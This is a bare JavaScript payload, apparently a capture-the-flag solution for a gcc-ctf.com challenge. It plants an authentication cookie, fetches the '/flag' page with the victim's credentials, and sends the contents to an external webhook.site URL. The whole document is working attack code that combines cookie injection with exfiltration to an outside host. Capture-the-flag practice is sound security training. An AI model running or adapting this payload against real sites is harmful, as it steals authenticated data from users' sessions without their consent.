async function fetchFlag() {
  document.cookie = "authentication=d29818364d8b4a4433002d0521556ba4; domain=gcc-ctf.com;";
  const flagResponse = await fetch('/flag', {
    credentials: 'include'
  });

  const flag = await flagResponse.text();
  const forwardUrl = `https://webhook.site/29edbaa7-b213-40e1-b7a5-42e7130c9bd1?flag=${encodeURIComponent(flag)}`;
  const forwardResponse = await fetch(forwardUrl);
}
fetchFlag();
